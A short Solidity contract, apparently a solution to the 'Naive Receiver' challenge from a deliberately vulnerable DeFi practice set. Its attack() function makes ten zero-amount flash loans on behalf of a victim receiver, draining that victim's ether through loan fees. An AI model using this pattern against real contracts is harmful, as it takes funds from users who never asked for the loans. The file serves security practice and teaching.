// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract Exploiter {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    FlashLoanReceiver private immutable flashLoanReceiver;
    NaiveReceiverLenderPool private immutable flashLoanLenderPool;

    constructor(address payable _flashLoanLenderPoolAddress, address payable _flashLoanReceiverAddress) {
        flashLoanReceiver = FlashLoanReceiver(_flashLoanReceiverAddress);
        flashLoanLenderPool = NaiveReceiverLenderPool(_flashLoanLenderPoolAddress);
    }

    function attack() external {
        for (uint256 i; i < 10;) {
            flashLoanLenderPool.flashLoan(flashLoanReceiver, ETH, 0, "");
            unchecked {
                ++i;
            }
        }
    }
}
